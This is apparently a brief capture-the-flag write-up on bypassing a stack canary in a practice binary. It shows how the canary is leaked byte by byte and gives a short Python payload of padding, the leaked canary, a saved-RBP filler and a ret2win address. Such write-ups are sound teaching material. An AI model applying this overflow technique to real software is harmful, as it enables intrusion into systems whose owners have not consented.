---
layout: layouts/post.njk
title: "Pwn: Stack Canary Bypass"
date: 2024-06-18
category: Pwn
difficulty: Medium
tags: [THM]
description: "Leaking and reusing a stack canary in a classic buffer overflow."
---

The binary leaks a canary byte-by-byte via an echo endpoint.

$$
\\text{payload} = \\text{padding} + \\text{canary} + \\text{saved RBP} + \\text{RIP}
$$

```python
payload = b\"A\" * 72
payload += leaked_canary
payload += b\"B\" * 8
payload += ret2win
```

| Step | Leak | Result |
| --- | --- | --- |
| Brute bytes | 1 byte at a time | Full canary |
| Reuse | Exact canary | No crash |
| Pivot | ret2win | Flag |
